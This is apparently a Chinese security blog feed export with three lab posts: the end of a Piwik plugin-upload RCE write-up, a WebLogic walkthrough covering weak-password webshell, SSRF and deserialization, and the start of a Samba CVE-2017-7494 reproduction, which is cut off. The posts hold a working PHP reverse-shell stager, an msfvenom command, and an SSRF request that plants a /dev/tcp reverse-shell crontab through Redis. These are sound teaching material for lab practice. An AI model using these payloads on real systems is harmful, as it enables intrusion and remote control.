<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_win01.jpg" alt="脚本说明"></p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_win02.jpg" alt="成功反弹生成meterpreter会话"></p>
<blockquote>
<p>利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。</p>
</blockquote>
<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。</p>
<p>这里仅仅用3.0.1举例，根据<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="noopener">firefart</a>说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。</p>
<p>Q:直接上传包含shell的压缩包可以吗？</p>
<p>A:可以上传成功，但在plugins目录下无法执行php代码。</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/shell_forbidden.jpg" alt="plugins目录下无法执行php代码"></p>
<p>Q:Payload中除了install()方法还可以写其他方法吗？</p>
<p>A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">ff</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span>//安装插件，执行一次</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">	$myfile = fopen(<span class="string">"install.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$content = <span class="string">"install ..."</span>;</span><br><span class="line">	fwrite($myfile, $content);</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uninstall</span><span class="params">()</span>//卸载插件，执行一次</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">	$myfile = fopen(<span class="string">"uninstall.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$content = <span class="string">"uninstall ..."</span>;</span><br><span class="line">	fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deactivate</span><span class="params">()</span>//关闭插件，可以多次执行</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">	$myfile = fopen(<span class="string">"deactivate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$content = <span class="string">"deactivate ..."</span>;</span><br><span class="line">	fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">()</span>//激活插件，可以多次执行</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">	$myfile = fopen(<span class="string">"activate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$content = <span class="string">"activate ..."</span>;</span><br><span class="line">	fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_error.jpg" alt="无法生成meterpreter会话"></p>
<p>A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。</p>
<p>具体可以这样操作：</p>
<p>首先看看Metasploit利用的Payload是什么。</p>
<p>可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用<code>print_status(&quot;data:#{payload.encoded}&quot;)</code>将其内容打印出来</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/payload_getdata.jpg" alt="打印Payload"></p>
<p>然后使用<code>reload_all</code>重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/payload_datas.jpg" alt="payload内容"></p>
<blockquote>
<p>或者可以利用<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php</code>来生成payload，内容一样</p>
</blockquote>
<p>然后将生成的内容放在插件PHP代码中。整理格式后如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    error_reporting(<span class="number">0</span>); </span><br><span class="line">	$ip = <span class="string">'192.168.131.128'</span>; </span><br><span class="line">	$port = <span class="number">4444</span>; </span><br><span class="line">	<span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">		$s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">		$s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; </span><br><span class="line">	&#125; <span class="keyword">elseif</span> (($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">		$s = $f(AF_INET, SOCK_STREAM, SOL_TCP); </span><br><span class="line">		$res = @socket_connect($s, $ip, $port); </span><br><span class="line">		<span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; </span><br><span class="line">		$s_type = <span class="string">'socket'</span>; </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'no socket funcs'</span>);</span><br><span class="line">	&#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; </span><br><span class="line">	<span class="keyword">switch</span> ($s_type) &#123; </span><br><span class="line">		<span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; </span><br><span class="line">		<span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; </span><br><span class="line">	$a = unpack(<span class="string">"Nlen"</span>, $len); </span><br><span class="line">	$len = $a[<span class="string">'len'</span>]; </span><br><span class="line">	$b = <span class="string">''</span>; </span><br><span class="line">	<span class="keyword">while</span> (strlen($b) &lt; $len) &#123; </span><br><span class="line">		<span class="keyword">switch</span> ($s_type) &#123; </span><br><span class="line">		<span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; </span><br><span class="line">		<span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line">	$GLOBALS[<span class="string">'msgsock'</span>] = $s; </span><br><span class="line">	$GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; </span><br><span class="line">	<span class="keyword">eval</span>($b);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就是利用上传插件来上传插件并激活了。</p>
<p>正确姿势：</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu_success.jpg" alt="msf_ubuntu_success"></p>
<blockquote>
<p>请注意要加<code>set PAYLOAD php/meterpreter/reverse_tcp</code>，不然会报各种错误。</p>
</blockquote>
<p>下面的为其中的错误。</p>
<p><img src="/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/msf_ubuntu.jpg" alt="msf_ubuntu"></p>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="noopener">https://firefart.at/post/turning_piwik_superuser_creds_into_rce/</a><br>[2]<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/7917</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> piwik </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic 常见漏洞环境的搭建及其利用]]></title>
      <url>/2017/06/05/Weblogic-Vulnerability-Verification/</url>
      <content type="html"><![CDATA[<h3 id="0x00-WebLogic-介绍及常见漏洞"><a href="#0x00-WebLogic-介绍及常见漏洞" class="headerlink" title="0x00 WebLogic 介绍及常见漏洞"></a>0x00 WebLogic 介绍及常见漏洞</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。<br>WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址<a href="https://github.com/phith0n/vulhub/tree/master/weblogic。" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/tree/master/weblogic。</a></p>
<a id="more"></a>
<h3 id="0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL"><a href="#0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL" class="headerlink" title="0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL"></a>0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL</h3><p>通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。<br>下载项目后进入到<code>/weblogic/weak_password</code>目录，运行命令<code>sudo docker-compose build</code>进行编译（请参照<a href="https://github.com/phith0n/vulhub/blob/master/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/README.md</a> 进行docker的安装）。<br>编译完成后进行启动<br>使用如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up <span class="_">-d</span> <span class="comment">#启动</span></span><br><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps <span class="comment">#查看启动的docker</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/启动WebLogic弱口令环境.png" alt="启动WebLogic弱口令环境"></p>
<p>Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：<a href="http://192.168.232.137:7001" target="_blank" rel="noopener">http://192.168.232.137:7001</a></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/访问WebLogic弱口令web项目.png" alt="访问WebLogic弱口令web项目"></p>
<p>访问 <a href="http://192.168.232.137:7001/console" target="_blank" rel="noopener">http://192.168.232.137:7001/console</a> 会跳转到管理员登录页面<a href="http://192.168.232.137:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.232.137:7001/console/login/LoginForm.jsp</a></p>
<p>这里用户名密码分别为：weblogic/Oracle@123<br>上传war过程如下图所示<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传war过程.gif" alt="上传war过程"></p>
<p>总结起来就是：<code>域结构-部署-安装-上传文件-将此部署安装为应用程序</code>。然后访问项目名称即可。</p>
<blockquote>
<p>如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md</a> ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。</p>
</blockquote>
<p><strong>WebLogic加密解密方式</strong></p>
<p>WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：<br><code>安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p>
<p>例如靶机中的密码文件位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p>
<p>内容为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=</span><br><span class="line">password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=</span><br></pre></td></tr></table></figure></p>
<p>加密key保存在SerializedSystemIni.dat文件中。默认位置：<br><code>安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p>
<p>靶机中的位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p>
<p>采用这两个文件就可以进行解密了。<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/解密密码.png" alt="解密WebLogic密码"></p>
<p>WebLogic 11gR1之前的版本采用的DES加密方式。<br><code>安装目录/samples/domains/wl_server/security/boot.properties</code><br>内容格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</span><br><span class="line">password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</span><br></pre></td></tr></table></figure></p>
<p>采用上面的解密工具即可解密。</p>
<h3 id="0x02-WebLogic-SSRF漏洞"><a href="#0x02-WebLogic-SSRF漏洞" class="headerlink" title="0x02 WebLogic SSRF漏洞"></a>0x02 WebLogic SSRF漏洞</h3><p>漏洞编号：CVE-2014-4210<br>漏洞影响：<br>    版本10.0.2,10.3.6<br>    Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。<br>进入到<code>/weblogic/ssrf</code>目录，运行命令<code>sudo docker-compose build</code>进行编译。</p>
<blockquote>
<p>编译时将Dockerfile文件中的第六行<code>&amp;&amp; yum update \</code>修改为<code>&amp;&amp; yum update -y \</code>，不然会出现错误<code>ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex     &amp;&amp; yum update     &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1</code>。并且无法编译。（感谢P牛的解答）</p>
</blockquote>
<p>编译完成后进行启动<br>使用如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up <span class="_">-d</span> <span class="comment">#启动</span></span><br><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps <span class="comment">#查看启动的docker</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/启动WebLogic SSRF环境.png" alt="启动WebLogic SSRF环境"></p>
<p>利用<a href="https://github.com/fupinglee/MyPython/blob/master/weblogic/weblogic_ssrf.py" target="_blank" rel="noopener">脚本</a>扫描内网开放端口的主机。</p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/SSRF扫描结果.png" alt="SSRF扫描结果"></p>
<p>根据<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md</a> 利用Redis反弹shell<br>在Ubuntu上执行命令<code>nc -l -p 1234</code><br>发送请求包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/<span class="built_in">test</span>%0D%0A%0D%0A<span class="built_in">set</span>%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20<span class="built_in">set</span>%20dir%20%2Fetc%2F%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1</span><br><span class="line">Host: 192.168.232.137:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; W<span class="keyword">in</span>64; x64; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/发送HTTP请求.png" alt="发送HTTP请求"></p>
<p>过一会查看Ubuntu可以看到一个shell</p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/反弹shell.png" alt="反弹shell"></p>
<p><strong>修复建议：</strong><br>    1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。<br>    2.安装oracle的更新包。</p>
<h3 id="0x03-WebLogic-反序列化漏洞"><a href="#0x03-WebLogic-反序列化漏洞" class="headerlink" title="0x03 WebLogic 反序列化漏洞"></a>0x03 WebLogic 反序列化漏洞</h3><p>漏洞编号：CVE-2015-4852<br>漏洞影响：<br>    Oracle WebLogic Server 12.2.1.0<br>    Oracle WebLogic Server 12.1.3.0<br>    Oracle WebLogic Server 12.1.2.0<br>    Oracle WebLogic Server 10.3.6.0<br>    Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。</p>
<p>这里还以SSRF的环境为例。<br>使用WebLogic反序列化工具进行验证（作者：rebeyond)。<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/反序列化1.png" alt="反序列化1"></p>
<p>一般web项目位于<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/</code>中<br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/反序列化2.png" alt="反序列化2"></p>
<p>发现没有_WL_user目录，所以把shell上传到自带的项目中。</p>
<p>通过执行命令<code>ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/</code><br>发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。<br>将shell文件上传到任意一个目录下的war文件即可。</p>
<p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt</code></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传测试文件.png" alt="上传测试文件"></p>
<p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp</code></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传webshell.png" alt="上传webshell"></p>
<p>也可以使用weget下载。</p>
<p>使用weak_password时，上传路径为</p>
<p><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt</code></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/上传测试文件2.png" alt="上传测试文件2"></p>
<blockquote>
<p>找WEB绝对路径的另一种方式，Linux下使用命令<code>find -name *.jsp</code>来查找，例如已知hello项目里面有个file.jsp，则查找的命令为<code>find -name file.jsp</code>。对于Windows下，使用<code>for /r c:\ %i in (file*.jsp) do @echo %i</code>，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。</p>
</blockquote>
<p><strong>linux下查找文件路径</strong></p>
<p><img src="/2017/06/05/Weblogic-Vulnerability-Verification/找文件目录.png" alt="找文件目录"></p>
<p><strong>Windows下查找路径</strong><br><img src="/2017/06/05/Weblogic-Vulnerability-Verification/Windows下查找路径.png" alt="Windows下查找路径"></p>
<p><strong>修复建议：</strong><br>    1.过滤T3协议<br>    2.安装补丁</p>
<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。<br>1.对于WebLogic弱口令，如何去上传WEBSHELL<br>2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。<br>3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。</p>
<h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p>[1]<a href="https://github.com/phith0n/vulhub/tree/master/weblogic" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/tree/master/weblogic</a><br>[2]<a href="http://blog.csdn.net/chs007chs/article/details/52514888" target="_blank" rel="noopener">http://blog.csdn.net/chs007chs/article/details/52514888</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> WebLogic漏洞 </tag>
            
            <tag> WebLogic反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Samba远程代码执行漏洞(CVE-2017-7494)复现过程]]></title>
      <url>/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/</url>
      <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件。2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。<br>这里采用ubuntu-16.04.2 x64位为测试机。<br><a id="more"></a></p>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建"></a>环境的搭建</h4><p>靶机中默认未安装Samba，首先来安装Samba并进行配置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install samba</span><br></pre></td></tr></table></figure>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/安装samba.png" alt="安装samba"></p>
<p>安装成功，查看版本</p>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/查看版本.png" alt="查看版本"></p>
<p>修改Samba配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>
<p>在最底部添加如下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[fuping] <span class="comment">#显示的共享文件夹名字</span></span><br><span class="line">path = /tmp</span><br><span class="line">public = yes</span><br><span class="line">writeable = yes</span><br></pre></td></tr></table></figure>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/修改配置文件.png" alt="修改配置文件"></p>
<p>然后重启smbd服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service smbd restart</span><br></pre></td></tr></table></figure>
<p>至此，环境已经搭建成功。开始用Kail进行攻击。</p>
<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>首先去下载利用的脚本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd /usr/share/metasploit-framework/modules/exploits/linux/samba</span></span><br><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/linux/samba<span class="comment"># wget https://raw.githubusercontent.com/hdm/metasploit-framework/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb -O is_known_pipename.rb</span></span><br></pre></td></tr></table></figure>
<p><img src="/2017/05/25/Samba-Remote-Code-Execution-Vulnerability-Replication/下载脚本.png" alt="下载脚本"></p>
<p>然后就是在Metasploit中加载并使用脚本，攻击过程如下</p>
